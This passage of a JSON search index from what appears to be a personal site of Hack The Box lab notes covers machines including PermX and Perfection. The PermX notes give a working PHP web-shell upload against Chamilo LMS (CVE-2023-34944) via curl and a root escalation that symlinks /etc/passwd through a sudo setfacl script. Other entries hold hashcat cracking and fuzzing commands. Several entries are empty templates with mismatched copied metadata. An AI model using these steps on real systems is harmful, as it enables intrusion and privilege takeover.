With this information, we can attack the hashes using brute force:</p> <pre><code>\nhashcat -a 3 -m 1400 hash_5 susan_nasus_?d?d?d?d?d?d?d?d?d\n\n</code></pre>"},{"location":"Machines/HTB_perfection/notes/#developed-map","title":"Developed map","text":"<p>![[Pasted image 20240707170219.png]]</p>"},{"location":"Machines/HTB_perfection/notes/#sources","title":"Sources","text":"<p>[[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby]] [[https://cheatsheet.haax.fr/passcracking-hashfiles/hashcat_cheatsheet/]]</p>"},{"location":"Machines/HTB_permx/commands/","title":"Commands","text":"<pre><code>gobuster dir -u permx.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x html\n</code></pre> <pre><code>ffuf -u http://permx.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.permx.htb' -fw 18\n</code></pre> <pre><code>$ echo '&lt;?php system(\"id\"); ?&gt;' &gt; rce.php\n$ curl -F 'bigUploadFile=@reverse.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'\nThe file has successfully been uploaded.\n$ curl 'http://lsm.permx.htb/main/inc/lib/javascript/bigupload/files/reverse.php'\n\n</code></pre> <pre><code>openssl passwd newpassword\n</code></pre> <pre><code>ln -s /etc/passwd file\nsudo /opt/acl.sh mtz rw ~/file\nvi file\n</code></pre>"},{"location":"Machines/HTB_permx/notes/","title":"Notes","text":"Name Permx Platform HTB Difficulty Ezz OS Linux Used techniques known exploit Technologies html, php, chamilo, hidden directories Tools gobuster,  BurpSuite, sqlmap, nc, strings, weak perms, symlink, discover credential CVEs CVE-2023-34944"},{"location":"Machines/HTB_permx/notes/#enumeration","title":"Enumeration","text":"<pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)\n|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)\n80/tcp open  http    Apache httpd 2.4.52\n|_http-title: Did not follow redirect to http://permx.htb\n|_http-server-header: Apache/2.4.52 (Ubuntu)\nService Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 21.54 seconds\n</code></pre> <p>Important points: Ubuntu, hostnamp. Possible users, enumeration from website: noah, elsie, ralph, mia and john doe.</p>"},{"location":"Machines/HTB_permx/notes/#directories","title":"Directories","text":"<p>There are no directories out of the web site spidern</p> <p>/courses.html /team.html                   /contact.html            /index.html                /about.html               /404                    /testimonial.html            </p> <p>None of them give us important information. There is no clear attack vector on this site.</p>"},{"location":"Machines/HTB_permx/notes/#subdomains","title":"subdomains","text":"<p>lms.permx.htb php extension, is an admin panel.</p> <p>![[Pasted image 20240710073644.png]]</p> <p>If we try to enumerate directories, we find /documentation and there says that the version is 1.11, but we can not find a exploit for this version. However, we saw that we can still. Apart from that, we discover: /bin, /src/, /app, ...</p> <p>![[Pasted image 20240710073416.png]]</p> <p>If we enumerate those directories, we will find config files and files with .php extension that can not be retrieved. It is a rabbit hole.</p> <p>After that, looking for information about this app we found a upload vulnerability in one of the directories: \"Unrestricted file upload in big file upload functionality in <code>/main/inc/lib/javascript/bigupload/inc/bigUpload.php</code> in Chamilo LMS &lt;= v1.11.24 allows unauthenticated attackers to perform stored cross-site scripting attacks and obtain remote code execution via uploading of web shell.\"</p>"},{"location":"Machines/HTB_permx/notes/#foothold","title":"Foothold","text":"<p>Knowing which vulnerability it has, we just need to upload a reverse shell. This is the PoC:</p> <pre><code>$ echo '&lt;?php system(\"id\"); ?&gt;' &gt; rce.php\n$ curl -F 'bigUploadFile=@rce.php' 'http://&lt;chamilo&gt;/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'\nThe file has successfully been uploaded.\n$ curl 'http://&lt;chamilo&gt;/main/inc/lib/javascript/bigupload/files/rce.php'\n\n</code></pre> <p>After getting shell, we can get access to those php files that we couldn't read before. In particular, app/config files will give us user account credentials:</p> <p>![[Pasted image 20240710075118.png]]</p> <p>If we spray them, we get ssh.</p>"},{"location":"Machines/HTB_permx/notes/#privilege-escalation","title":"Privilege Escalation","text":"<p>We can execute sudo for one script.:</p> <p>![[Pasted image 20240710075214.png]]</p> <p>There is a section for setfacl in gtfobins, however there are restrictions if we try to apply this script for files outside our home directory. One way to bypass them is using *symlinks.</p> <p>If we create a symlink pointing to /etc/passwd, we can modify the perms in order to get root privileges.</p> <p>In resume, we can execute on binary (setfacl) with root privileges to assign /etc/passwd with weak permission.</p> <pre><code>ln -s /etc/passwd file\nsudo /opt/acl.sh mtz rw ~/file\nvi file\n</code></pre> <p>![[Pasted image 20240710080348.png]]</p>"},{"location":"Machines/HTB_permx/notes/#developed-map","title":"Developed map","text":"<p>![[permx10.10.11.23.png]]</p>"},{"location":"Machines/HTB_permx/notes/#sources","title":"Sources","text":"<p>[[https://starlabs.sg/advisories/23/23-4220/]] [[https://gtfobins.github.io/gtfobins/setfacl/]] [[https://infinitelogins.com/2021/02/24/linux-privilege-escalation-weak-file-permissions-writable-etc-passwd/]]</p>"},{"location":"Machines/HTB_season6_resource/commmands/","title":"Commmands","text":"<pre><code>rustscan -t 10000 -u 5000 -b 500 -a 10.10.11.27\n</code></pre>"},{"location":"Machines/HTB_season6_resource/notes/","title":"Notes","text":"Name Resource Platform HTB Difficulty Medium OS Resource Used techniques sudomain enumeration,  SQLi, crack hashes, File Upload attack, credentials finding, reverse, wildcards spare tricks. Technologies Laravel, Laravel-admin Tools gobuster,  BurpSuite, sqlmap, nc, strings CVEs cve-2023-24249"},{"location":"Machines/HTB_season6_resource/notes/#enumeration","title":"Enumeration","text":"<p>![[Pasted image 20240803210359.png]]</p> <p>2 ssh user: zzinter</p>"},{"location":"Machines/HTB_season6_resource/notes/#directories","title":"Directories","text":""},{"location":"Machines/HTB_season6_resource/notes/#subdomains","title":"subdomains","text":""},{"location":"Machines/HTB_season6_resource/notes/#foothold","title":"Foothold","text":""},{"location":"Machines/HTB_season6_resource/notes/#lateral-movement","title":"Lateral Movement","text":""},{"location":"Machines/HTB_season6_resource/notes/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Machines/HTB_season6_resource/notes/#developed-map","title":"Developed map","text":""},{"location":"Machines/HTB_season6_resource/notes/#sources","title":"Sources","text":""},{"location":"Machines/HTB_seasson6_sea/command/","title":"Command","text":"<pre><code>\nferoxbuster --url http://sea.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n</code></pre>"},{"location":"Machines/HTB_seasson6_sea/notes/","title":"Notes","text":"Name Sea Platform HTB Difficulty Easy OS Linux Used techniques sudomain enumeration,  SQLi, crack hashes, File Upload attack, credentials finding, reverse, wildcards spare tricks. Technologies Laravel, Laravel-admin Tools gobuster,  BurpSuite, sqlmap, nc, strings CVEs cve-2023-24249"},{"location":"Machines/HTB_seasson6_sea/notes/#enumeration","title":"Enumeration","text":"<p>![[Pasted image 20240812170319.png]]</p> <p>After inspecting the web, we found some form where it drives us to nothing.  Using feroxbuster we find some directories that show us the CMS on use.</p>"},{"location":"Machines/HTB_seasson6_sea/notes/#directories","title":"Directories","text":""},{"location":"Machines/HTB_seasson6_sea/notes/#subdomains","title":"subdomains","text":""},{"location":"Machines/HTB_seasson6_sea/notes/#foothold","title":"Foothold","text":""},{"location":"Machines/HTB_seasson6_sea/notes/#lateral-movement","title":"Lateral Movement","text":""},{"location":"Machines/HTB_seasson6_sea/notes/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Machines/HTB_seasson6_sea/notes/#developed-map","title":"Developed map","text":""},{"location":"Machines/HTB_seasson6_sea/notes/#sources","title":"Sources","text":""},{"location":"Machines/HTB_trickster/notes/","title":"Notes","text":"Name Trickster Platform HTB Difficulty Medium OS Linux Used techniques Technologies Laravel, Laravel-admin Tools gobuster,  BurpSuite, sqlmap, nc, strings CVEs cve-2023-24249"},{"location":"Machines/HTB_trickster/notes/#enumeration","title":"Enumeration","text":"<p>PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA) |  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519) 80/tcp open  http    Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://trickster.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) Service Info: Host: ; OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>"},{"location":"Machines/HTB_trickster/notes/#directories","title":"Directories","text":""},{"location":"Machines/HTB_trickster/notes/#subdomains","title":"subdomains","text":""},{"location":"Machines/HTB_trickster/notes/#foothold","title":"Foothold","text":""},{"location":"Machines/HTB_trickster/notes/#lateral-movement","title":"Lateral Movement","text":""},{"location":"Machines/HTB_trickster/notes/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Machines/HTB_trickster/notes/#developed-map","title":"Developed map","text":""},{"location":"Machines/HTB_trickster/notes/#sources","title":"Sources","text":"<p>https://github.com/aelmokhtar/CVE-2024-34716 https://blog.hacktivesecurity.com/index.php/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/</p>"},{"location":"Machines/HTB_yummy/notes/","title":"Notes","text":"Name Usage Platform HTB Difficulty Easy OS Linux Used techniques sudomain enumeration,  SQLi, crack hashes, File Upload attack, credentials finding, reverse, wildcards spare tricks. Technologies Laravel, Laravel-admin Tools gobuster,  BurpSuite, sqlmap, nc, strings CVEs cve-2023-24249"},{"location":"Machines/HTB_yummy/notes/#enumeration","title":"Enumeration","text":""},{"location":"Machines/HTB_yummy/notes/#directories","title":"Directories","text":""},{"location":"Machines/HTB_yummy/notes/#subdomains","title":"subdomains","text":""},{"location":"Machines/HTB_yummy/notes/#foothold","title":"Foothold","text":""},{"location":"Machines/HTB_yummy/notes/#lateral-movement","title":"Lateral Movement","text":""},{"location":"Machines/HTB_yummy/notes/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Machines/HTB_yummy/notes/#developed-map","title":"Developed map","text":""},{"location":"Machines/HTB_yummy/notes/#sources","title":"Sources","text":""}]}